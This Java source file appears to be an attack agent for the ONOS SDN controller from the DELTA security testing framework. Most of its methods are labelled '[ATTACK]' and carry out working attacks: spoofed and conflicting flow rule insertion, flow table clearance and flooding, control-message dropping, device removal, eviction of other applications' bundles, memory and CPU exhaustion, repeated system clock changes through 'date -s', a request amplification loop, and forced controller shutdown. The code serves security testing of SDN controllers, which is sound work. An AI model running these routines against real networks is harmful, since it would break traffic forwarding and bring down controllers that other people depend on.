package org.deltaproject.onosagent;

import com.google.common.collect.Lists;
import iitp2018.NetworkLoopDetector;
import org.apache.felix.scr.annotations.*;
import org.onlab.metrics.MetricsService;
import org.onlab.packet.*;
import org.onosproject.app.ApplicationAdminService;
import org.onosproject.app.ApplicationService;
import org.onosproject.cfg.ComponentConfigService;
import org.onosproject.cfg.ConfigProperty;
import org.onosproject.cluster.ClusterAdminService;
import org.onosproject.cluster.ClusterService;
import org.onosproject.core.ApplicationId;
import org.onosproject.core.CoreService;
import org.onosproject.mastership.MastershipAdminService;
import org.onosproject.net.*;
import org.onosproject.net.device.DeviceAdminService;
import org.onosproject.net.device.DeviceClockService;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.flow.*;
import org.onosproject.net.flow.criteria.Criterion;
import org.onosproject.net.flow.criteria.EthCriterion;
import org.onosproject.net.flow.criteria.PortCriterion;
import org.onosproject.net.flow.instructions.Instruction;
import org.onosproject.net.flow.instructions.Instructions.OutputInstruction;
import org.onosproject.net.flowobjective.DefaultForwardingObjective;
import org.onosproject.net.flowobjective.FlowObjectiveService;
import org.onosproject.net.flowobjective.ForwardingObjective;
import org.onosproject.net.host.HostAdminService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.link.LinkAdminService;
import org.onosproject.net.link.LinkService;
import org.onosproject.net.packet.*;
import org.onosproject.net.statistic.FlowStatisticStore;
import org.onosproject.net.topology.TopologyService;
import org.onosproject.openflow.controller.Dpid;
import org.onosproject.openflow.controller.OpenFlowController;
import org.onosproject.openflow.controller.OpenFlowMessageListener;
import org.osgi.framework.Bundle;
import org.osgi.framework.BundleContext;
import org.osgi.framework.BundleException;
import org.osgi.framework.ServiceReference;
import org.osgi.service.component.ComponentContext;
import org.osgi.service.component.ComponentInstance;
import org.projectfloodlight.openflow.protocol.*;
import org.projectfloodlight.openflow.protocol.action.OFAction;
import org.projectfloodlight.openflow.protocol.action.OFActionOutput;
import org.slf4j.Logger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.*;

import static java.util.concurrent.Executors.newSingleThreadExecutor;
import static org.onlab.util.Tools.groupedThreads;
import static org.slf4j.LoggerFactory.getLogger;

/**
 * An App Agent Application for ONOS v1.13.1.
 */
@Component(immediate = true)
public class AppAgent {

    private static final int DEFAULT_TIMEOUT = 10;
    private static final int DEFAULT_PRIORITY = 10;

    private final Logger log = getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected TopologyService topologyService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowObjectiveService flowObjectiveService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected PacketService packetService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowRuleService flowRuleService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ComponentConfigService cfgService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected LinkService linkService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected MetricsService metricsService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ClusterService clusterService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceClockService clockService;

    // for Admin Service
    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected HostAdminService hostadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected DeviceAdminService deviceadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ApplicationAdminService appadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected LinkAdminService linkadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ClusterAdminService clusteradmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected FlowStatisticStore statsStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected MastershipAdminService msadmin;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected OpenFlowController controller;

    @Reference(cardinality = ReferenceCardinality.MANDATORY_UNARY)
    protected ApplicationService appService;

    private ReactivePacketProcessor processor = new ReactivePacketProcessor();

    @Property(name = "flowTimeout", intValue = DEFAULT_TIMEOUT,
            label = "Configure Flow Timeout for installed flow rules; " + "default is 10 sec")

    private int flowTimeout = DEFAULT_TIMEOUT;

    private ApplicationId appId;
    private AMInterface cm;
    private ComponentContext contextbk;
    private SystemTimeSetThread systemTimeThread;
    private boolean isDrop = false;
    private boolean isLoop = false;
    private Random ran = new Random();
    private PacketContext dropped = null;

    private final InternalMessageListener listener = new InternalMessageListener();
    private String isInconsistency;
    private int checkInconsistencyFlag = 0;

    private NetworkLoopDetector nad;

    @Activate
    public void activate(ComponentContext context) {
        contextbk = context;
        // cfgService.registerProperties(getClass());

        appId = coreService.registerApplication("org.deltaproject.onosagent");

//        packetService.addProcessor(processor, PacketProcessor.ADVISOR_MAX);
//
//        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
//        selector.matchEthType(Ethernet.TYPE_IPV4);
//        packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
//                appId);
//        selector.matchEthType(Ethernet.TYPE_ARP);
//        packetService.requestPackets(selector.build(), PacketPriority.REACTIVE,
//                appId);


        log.info("Started with Application ID {}", appId.id());

//        cm = new AMInterface(this);
//        cm.start();
        controller.addMessageListener(listener);

//        nad = new NetworkLoopDetector(ctrl, deviceService, flowRuleService, coreService, linkService);
//        nad.start();
    }

    @Deactivate
    public void deactivate() {
        // cfgService.unregisterProperties(getClass(), false);
        flowRuleService.removeFlowRulesById(appId);
        packetService.removeProcessor(processor);
        processor = null;
        nad.stop();
//        try {
//            cm.interrupt();
//            cm.join();
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
        log.info("Stopped");

    }

    // Attack/Misuses
    public void testFlowRuleBlocking() {
        System.out.println("[ATTACK] Flow Rule Blocking");

        ArrayList<String> cpName = Lists.newArrayList(cfgService
                .getComponentNames());

        for (String s : cpName) {
            System.out.println(s);
            ArrayList<ConfigProperty> plist = Lists.newArrayList(cfgService
                    .getProperties(s));

            for (ConfigProperty p : plist) {
                System.out.println(p.name());
            }

        }

//        this.cfgService.setProperty(
//                "org.onosproject.provider.host.impl.HostLocationProvider",
//                "hostRemovalEnabled", "false");

        this.cfgService.setProperty(
                "org.onosproject.fwd.ReactiveForwarding",
                "packetOutOnly", "true");
    }


    private boolean isAttackStart = false;
    private String consistencyTestRes = "fail";

    private FlowRule existFlowRule; // Rule named with 'org.onosproject.fwd'

    // 3.1.00* testInconsistency
    public String testInconsistency(char type) {
        System.out.println("[ATTACK] Inconsistency attack");

        Iterable<Device> dvs = null;
        do {
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            dvs = deviceService.getDevices();

        } while (!dvs.iterator().hasNext());

        Device d = dvs.iterator().next();

        TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        switch (type) {
            case '1':
                treat.setOutput(PortNumber.portNumber(2));

                selector.matchInPort(PortNumber.portNumber(1));
                selector.matchEthType((short) 0x0800);

                ApplicationId fwdId = coreService.getAppId("org.onosproject.fwd");
                existFlowRule = new DefaultFlowRule(d.id(),
                        selector.build(), treat.build(), 555,       // priority: 555
                        fwdId, flowTimeout, true, null);
                System.out.println("[ATTACK] Flow Rule inserted with name of Reactive forwarding, appId = " + fwdId);
                System.out.println("* " + existFlowRule.toString());
                flowRuleService.applyFlowRules(existFlowRule);

                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                FlowRule newFlowRule; // Rule named with 'org.deltaproject.onosagent'
                newFlowRule = new DefaultFlowRule(d.id(),
                        selector.build(), treat.build(), 555,       // priority: 555
                        appId, flowTimeout, true, null);

                System.out.println("[ATTACK] Flow Rule inserted with name of Delta, appId = " + appId);
                System.out.println("* " + newFlowRule.toString());
                flowRuleService.applyFlowRules(newFlowRule);

                //TODO: Show flow rule stored in storage here
                //System.out.println("[Storage] Flow Rule from storage, appId = " + appId);
                //System.out.println("** " + storageFlowRule.toString());
                isAttackStart = true;


                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }


                return consistencyTestRes;
            case '2':
                long outputPortNum = 65536;
                treat.setOutput(PortNumber.portNumber(outputPortNum));

                selector.matchInPort(PortNumber.portNumber(1));
                selector.matchEthType((short) 0x0800);

                existFlowRule = new DefaultFlowRule(d.id(),
                        selector.build(), treat.build(), 555,       // priority: 555
                        appId, flowTimeout, true, null);
                System.out.println("[ATTACK] Flow Rule inserted with output port of " + outputPortNum);
                flowRuleService.applyFlowRules(existFlowRule);
                return consistencyTestRes;
        }
        return consistencyTestRes;
    }

    // 2.1.060
    public String sendUnFlaggedFlowRemoveMsg(String cmd, long ruleId) {

        if (cmd.contains("install")) {
            TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
            treat.drop();

            TrafficSelector.Builder selector = DefaultTrafficSelector.builder();
            selector.matchInPort(PortNumber.portNumber(1));
            selector.matchEthType((short) 0x0800);

            Iterable<Device> dvs = null;
            do {
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                dvs = deviceService.getDevices();

            } while (!dvs.iterator().hasNext());

            while (dvs.iterator().hasNext()) {
                Device d = dvs.iterator().next();
                FlowRule newf = new DefaultFlowRule(d.id(),
                        selector.build(), treat.build(), 555,       // priority: 555
                        appId, flowTimeout, true, null);

                flowRuleService.applyFlowRules(newf);

                log.info("Install a flow rule : {} to {}", newf, d);

                String result = "Installed flow rule id|" + newf.id().value();
                return result;
            }
        } else if (cmd.contains("check")) {
            Iterable<FlowRule> flowRulesById = flowRuleService.getFlowRulesById(appId);

            Boolean result = true;

            for (FlowRule rule : flowRulesById) {
                if (rule.id().value() == ruleId) {
                    result = false;
                }
            }

            if (result) {
                return "success";
            } else {
                return "fail";
            }
        }

        return "fail";
    }


    public boolean setControlMessageDrop() {
        System.out.println("[ATTACK] Set Control Message Drop");
        isDrop = true;
        return true;
    }

    public String testControlMessageDrop() {
        System.out.println("[ATTACK] Start Control Message Drop");
        String drop = "";

        while (processor.getDropped() == null) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }

        InboundPacket in = processor.getDropped().inPacket();

        Ethernet eth = in.parsed();

        drop = processor.getDropped().toString();
        if (eth != null) {
            drop = eth.toString();
        } else {
            drop = in.toString();
        }

        System.out.println("[ATTACK] Dropped Message: " + drop);
        return drop;
    }

    public boolean setInfiniteLoop() {
        System.out.println("[ATTACK] Set Infinite Loop");
        this.isLoop = true;

        return true;
    }

    public static boolean testInfiniteLoop() {
        System.out.println("[ATTACK] Start Infinite Loop");
        int i = 0;

        while (i < 32767) {
            i++;

            if (i == 32766) {
                i = 0;
            }
        }
        return true;
    }

    public String testInternalStorageAbuse() {
        System.out.println("[ATTACK] Internal Storage Abuse");

        String removed = "nothing";

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        if (it.hasNext()) {
            removed = "success|";
        }

        while (it.hasNext()) {
            Device piece = (Device) it.next();
            deviceadmin.removeDevice(piece.id());
            removed += piece.id() + "-" + piece.serialNumber() + "|";
        }

        System.out.println("[ATTACK] Device Remove: \n" + removed);
        Iterable<Link> links = linkService.getActiveLinks();
        it = dv.iterator();
        while (it.hasNext()) {
            Link link = (Link) it.next();
        }

        return removed;
    }

    public String testFlowRuleModification() {
        System.out.println("[ATTACK] Flow Rule Modification");
        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        String result = "";

        while (it.hasNext()) {
            Device piece = (Device) it.next();
            Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece.id());
            Iterator f = fe.iterator();

            while (f.hasNext()) {
                FlowEntry old = (FlowEntry) f.next();
                TrafficTreatment.Builder treat = DefaultTrafficTreatment
                        .builder();

                FlowRule newf;
                newf = new DefaultFlowRule(old.deviceId(),
                        old.selector(), treat.build(), old.priority(),
                        appId, old.timeout(), false, old.payLoad());

                flowRuleService.removeFlowRules(old);
                flowRuleService.applyFlowRules(newf);

                result = "success|" + old.toString() + "\n ---> "
                        + newf.toString();
                System.out.println("\n[ATTACK] " + result + "\n");
            }
        }

        return result;
    }

    public String testFlowTableClearance() {
        System.out.println("[ATTACK] Flow Table Clearance");

        String flows = "nothing";

        int cnt = 1;
        /* forever */
        for (int i = 0; i < cnt; i++) {
            Iterable<Device> dv = deviceService.getDevices();
            Iterator it = dv.iterator();

            while (it.hasNext()) {
                Device piece = (Device) it.next();
                Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece
                        .id());
                Iterator f = fe.iterator();

                while (f.hasNext()) {
                    FlowEntry e = (FlowEntry) f.next();
                    TrafficSelector select = e.selector();
                    Criterion c = select.getCriterion(Criterion.Type.ETH_TYPE);

                    flowRuleService.removeFlowRules(e);

                    try {
                        Thread.sleep(500);
                    } catch (InterruptedException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        }

        return flows;
    }

    public boolean testEventListenerUnsubscription() {
        BundleContext bc = contextbk.getBundleContext();
        ComponentInstance ci = contextbk.getComponentInstance();

        Bundle[] blist = bc.getBundles();

        for (int i = 0; i < blist.length; i++) {
            Bundle bd = blist[i];
            bd.getRegisteredServices();

            ServiceReference[] servicelist = bd.getRegisteredServices();

//            for (ServiceReference sr : servicelist) {
//
//            }
        }

        return true;
    }

    public String testApplicationEviction(String appname) {
        System.out.println("[ATTACK] Application Eviction");
        boolean isRemoved = false;
        String result = "";

        BundleContext bc = contextbk.getBundleContext();

        Bundle[] blist = bc.getBundles();

        for (int i = 0; i < blist.length; i++) {
            Bundle bd = blist[i];
            bd.getRegisteredServices();

            if (bd.getSymbolicName().contains(appname)) {
                isRemoved = true;
                result = bd.getSymbolicName();

                System.out.println("[ATTACK] " + result + " is uninstalled!");

                try {
                    bd.uninstall();
                } catch (BundleException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

        if (!isRemoved) {
            result = "fail";
        }

        return result;
    }

    public void testResourceExhaustionMem() {
        System.out.println("[ATTACK] Resource Exhausion : Mem");

        long[][] ary;
        ArrayList<long[][]> arry;

        arry = new ArrayList<long[][]>();

        while (true) {
            ary = new long[Integer.MAX_VALUE][Integer.MAX_VALUE];
            arry.add(new long[Integer.MAX_VALUE][Integer.MAX_VALUE]);
            ary[ran.nextInt(Integer.MAX_VALUE)][ran.nextInt(Integer.MAX_VALUE)] = 1;
        }
    }

    public boolean testResourceExhaustionCpu() {
        System.out.println("[ATTACK] Resource Exhaustion : CPU");

        for (int count = 0; count < 100; count++) {
            CpuThread cpuThread = new CpuThread();
            cpuThread.start();
        }

        return true;
    }

    public boolean testSystemVariableManipulation() {
        System.out.println("[ATTACK] System Variable Manipulation");
        this.systemTimeThread = new SystemTimeSetThread();
        systemTimeThread.start();
        return true;
    }

    public boolean testSystemCommandExecution() {
        System.out.println("[ATTACK] System Command Execution");
        System.exit(0);

        return true;
    }

    public boolean testFlowRuleFlooding() {
        System.out.println("[ATTACK] Flow Rule Flooding");
        TrafficTreatment.Builder treat = DefaultTrafficTreatment.builder();
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        while (it.hasNext()) {
            Device piece = (Device) it.next();

            for (int i = 0; i < 32767; i++) {
                selector.matchEthDst(MacAddress.valueOf(ran.nextLong()));
                FlowRule newf = new DefaultFlowRule(piece.id(),
                        selector.build(), treat.build(), ran.nextInt(32767),
                        appId, flowTimeout, true, null);

                flowRuleService.applyFlowRules(newf);
            }
        }

        return true;
    }

    public String testSwitchFirmwareMisuse() {
        String result = "flows";

        System.out.println("\n\n[ATTACK] Switch Firmware Misuse");
        TrafficSelector.Builder selector = DefaultTrafficSelector.builder();

        Iterable<Device> dv = deviceService.getDevices();
        Iterator it = dv.iterator();

        while (it.hasNext()) {
            Device piece = (Device) it.next();
            Iterable<FlowEntry> fe = flowRuleService.getFlowEntries(piece.id());
            Iterator f = fe.iterator();

            while (f.hasNext()) {
                FlowEntry old = (FlowEntry) f.next();

                Criterion c = old.selector().getCriterion(Criterion.Type.ETH_TYPE);

                if (c != null) {
                    String type = c.toString();

                    /* MAC -> IP addr for IP packet */
                    if (type.contains("800")) {
                        EthCriterion dst = (EthCriterion) old.selector().getCriterion(Criterion.Type.ETH_DST);
                        EthCriterion src = (EthCriterion) old.selector().getCriterion(Criterion.Type.ETH_SRC);

                        if (dst != null && src != null) {
                            Set<Host> shost = hostService.getHostsByMac(src
                                    .mac());
                            Set<Host> dhost = hostService.getHostsByMac(dst
                                    .mac());
                            Host srcH = new ArrayList<Host>(shost).get(0);
                            Host dstH = new ArrayList<Host>(dhost).get(0);

                            Set<IpAddress> srcIpSet = srcH.ipAddresses();
                            Set<IpAddress> dstIpSet = dstH.ipAddresses();
                            IpAddress srcIP = new ArrayList<IpAddress>(srcIpSet)
                                    .get(0);
                            IpAddress dstIP = new ArrayList<IpAddress>(dstIpSet)
                                    .get(0);

                            Ip4Prefix matchIp4SrcPrefix = Ip4Prefix
                                    .valueOf(dstIP.toOctets(),
                                            Ip4Prefix.MAX_MASK_LENGTH);
                            Ip4Prefix matchIp4DstPrefix = Ip4Prefix
                                    .valueOf(srcIP.toOctets(),
                                            Ip4Prefix.MAX_MASK_LENGTH);

                            PortCriterion port = (PortCriterion) old.selector().getCriterion(
                                    Criterion.Type.IN_PORT);

                            selector.matchInPort(port.port())
                                    .matchIPSrc(matchIp4SrcPrefix)
                                    .matchIPDst(matchIp4DstPrefix);

                            FlowRule newf = new DefaultFlowRule(old.deviceId(),
                                    selector.build(), old.treatment(),
                                    old.priority(), this.appId, old.timeout(),
                                    false, null);

                            result = "Mac Address " + src.toString()
                                    + "\n--> IP Address " + srcIP.toString();

                            System.out.println("\n[ATTACK] " + result + "\n");

                            flowRuleService.removeFlowRules(old);
                            flowRuleService.applyFlowRules(newf);
                        }
                    }
                }
            }
        }
        return result;
    }

    // 3.1.240
    public String testInfiniteFlowRuleSynchronization() {
        System.out.println("[ATTACK] Infinite Flow Rule Synchronization");
        isInconsistency = "nothing";
        checkInconsistencyFlag = 2;

        Iterable<Device> iterableDevice = deviceService.getDevices();
        Iterator iteratorDevice = iterableDevice.iterator();

        System.out.println("\n===================== [Controller DB] ======================");
        while (iteratorDevice.hasNext()) {
            int flowRuleCount = 0;
            Device device = (Device) iteratorDevice.next();
            System.out.println("-------------------------");
            System.out.println("[Switch] " + device.id());
            Iterable<FlowEntry> iterableFlow = flowRuleService.getFlowEntries(device.id());
            Iterator iteratorFlow = iterableFlow.iterator();
            ArrayList<FlowEntry> tempList = new ArrayList<>();

            while (iteratorFlow.hasNext()) {
                FlowEntry flowEntry = (FlowEntry) iteratorFlow.next();
                if (flowEntry.toString().contains("CONTROLLER")) {
                    flowRuleCount++;
                    //System.out.println("<FlowRule> " + flowEntry);
                } else {
                    flowRuleCount++;
                    tempList.add(flowEntry);
                }
            }

            Iterator tempIt = tempList.iterator();
            while (tempIt.hasNext()) {
                System.out.println("* Data | <Controller> <FlowRule> " + tempIt.next());
            }

            System.out.println("-------------------------");
            System.out.println("[Result] " + device.id() + " FlowRuleCount: [ " + flowRuleCount + " ]");
            System.out.println("-------------------------\n");
        }
        System.out.println("==========================================================\n\n");

        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        return isInconsistency;
    }

    // 3.1.250
    public String testTableFeaturesReplyAmplification() throws Exception {
        System.out.println("[ATTACK] Table Features Request Amplification Attack");
        log.info("[ATTACK] Table Features Request Amplification Attack");
        Device device = deviceService.getAvailableDevices().iterator().next();
        log.info("Target Device: " + device.id().toString());
        OFFactory factory = OFFactories.getFactory(OFVersion.OF_13);

//        List<OFInstruction> insts = Lists.newLinkedList();
//        insts.add()
//
//        factory.buildFlowAdd()
//                .setMatch(factory.matchWildcardAll())
//                .setInstructions()

        OFTableFeaturesStatsRequest request = factory.buildTableFeaturesStatsRequest()
                .setXid(777)
                .build();
//        OFFactory factory = OFFactories.getFactory(OFVersion.OF_13);
//        OFCalientFlowStatsRequest request = factory.buildCalientFlowStatsRequest()
//                .setMatch(factory.matchWildcardAll())
//                .setXid(777)
//                .build();

        while (true) {
            controller.write(Dpid.dpid(device.id().uri()), request);
            Thread.sleep(50);
        }
    }

    /**
     * Packet processor responsible for forwarding packets along their paths.
     */
    private class ReactivePacketProcessor implements PacketProcessor {
        public PacketContext droppedPacket = null;

        public PacketContext getDropped() {
            return droppedPacket;
        }

        public void process(PacketContext context) {

            if (context.isHandled()) {
                return;
            }

            Ethernet packet = context.inPacket().parsed();

            if (packet == null) {
                return;
            }
            if (isDrop) {
                if (droppedPacket == null) {
                    droppedPacket = context;
                }

                InboundPacket ip = context.inPacket();
                Ethernet eth = ip.parsed();
                System.out.println("Drop Packet Info: ");
                System.out.println(eth.toString() + "\n");

                context.block();
            } else if (isLoop) {
                AppAgent.testInfiniteLoop();
            } else {
                if (packet.getEtherType() == Ethernet.TYPE_IPV4) {
                    IPv4 ipv4Packet = (IPv4) packet.getPayload();
                    log.info("TTL value: {}", ipv4Packet.getTtl());
                }
            }
        }
    }

    /**
     * Thread class for a resource exhaustion attack.
     */
    public class CpuThread extends Thread {
        private int result = 2;
        private int cnt = 0;

        @Override
        public void run() {
            while (true) {
                result = result ^ 2;
                cnt++;

                if (cnt == 1000) {
                    cnt = -1;
                }
            }
        }
    }

    /**
     * Thread class for a system variable manipulation.
     */
    private final class SystemTimeSetThread extends Thread {
        private Runtime rt;
        private String[] dateInfo;
        private int day;
        private final String[] month = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Dep", " Oct", "Nov",
                "Dec"};
        private int year;
        private Random rand;

        public SystemTimeSetThread() {
            rt = Runtime.getRuntime();
            dateInfo = new String[3];
            rand = new Random();

        }

        @Override
        public void run() {
            while (true) {
                day = rand.nextInt(29) + 1;
                year = rand.nextInt(100) + 1970;
                dateInfo[0] = String.valueOf(day);
                dateInfo[1] = month[rand.nextInt(11)];
                dateInfo[2] = String.valueOf(year);
                try {
                    Process proc = rt.exec(new String[]{"date", "-s", dateInfo[0] + " " + dateInfo[1] + " "
                            + dateInfo[2]});
                    BufferedReader br = new BufferedReader(new InputStreamReader(
                            proc.getInputStream()));
                    System.out.println("System time setting info : "
                            + br.readLine());
                    Thread.sleep(500);
                } catch (IOException e) {
                    // TODO Auto-generated catch block
                    System.out.println("System set error");
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }
    }

    /**
     * for inconsistent attack cases in black hat 2018
     */
    class InternalMessageListener implements OpenFlowMessageListener {
        @Override
        public void handleIncomingMessage(Dpid dpid, OFMessage ofMessage) {
            if (ofMessage.getType() == OFType.STATS_REPLY) {
                if (((OFStatsReply) ofMessage).getStatsType() == OFStatsType.FLOW) {
                    if (checkInconsistencyFlag < 1) {
                        return;
                    } else {
                        checkInconsistencyFlag--;
                    }

                    System.out.println("\n===================== [Switch DB] ======================");
                    int flowRuleCount = 0;
                    DeviceId deviceId = DeviceId.deviceId(Dpid.uri(dpid));
                    //System.out.println("* Data | [Switch " + deviceId.toString().substring(17, 19) + "]");
                    OFFlowStatsReply msg = (OFFlowStatsReply) ofMessage;
                    List<OFFlowStatsEntry> entryList = msg.getEntries();

                    for (OFFlowStatsEntry e : entryList) {
                        if (!e.toString().contains("ctrl")) {
                            flowRuleCount++;
                            System.out.println("* Data | <Switch " + deviceId.toString().substring(17, 19) + ">, <FlowRule> " + e.toString());
                        } else {
                            //flowRuleCount++;
                        }
                    }

                    //System.out.println("---------------");
                    //System.out.println("[Result] " + deviceId + " FlowRuleCount: [ " + flowRuleCount + " ]");
                    //System.out.println("---------------\n");

                    Iterable<Device> iterableDevice = deviceService.getDevices();
                    Iterator iteratorDevice = iterableDevice.iterator();

                    while (iteratorDevice.hasNext()) {
                        Device device = (Device) iteratorDevice.next();
                        if (!device.id().toString().equals(deviceId.toString())) {
                            continue;
                        }
                        Iterable<FlowEntry> iterableFlow = flowRuleService.getFlowEntries(device.id());
                        Iterator iteratorFlow = iterableFlow.iterator();

                        while (iteratorFlow.hasNext()) {
                            boolean found = false;
                            FlowEntry flowEntry = (FlowEntry) iteratorFlow.next();
                            if (flowEntry.toString().contains("CONTROLLER")) {
                                continue;
                            }
                            for (OFFlowStatsEntry e : entryList) {
                                if (e.toString().contains("ctrl")) {
                                    continue;
                                }
                                if (flowEntry.id().value() != e.getCookie().getValue()) {
                                    continue;
                                }

                                Instruction tempF = (OutputInstruction) flowEntry.treatment().immediate().get(0);
                                OFAction tempE = (OFActionOutput) e.getActions().get(0);

                                long tempFOutput = ((OutputInstruction) tempF).port().toLong();
                                long tempEOutput = ((OFActionOutput) tempE).getPort().getPortNumber();

                                if (tempFOutput != tempEOutput) {
                                    break;
                                }

                                found = true;
                                break;
                            }

                            if (!found) {
                                isInconsistency = flowEntry.toString();
                                break;
                            }
                        }
                    }
                }
            }
        }

        @Override
        public void handleOutgoingMessage(Dpid dpid, List<OFMessage> list) {
            return;
        }
    }
}
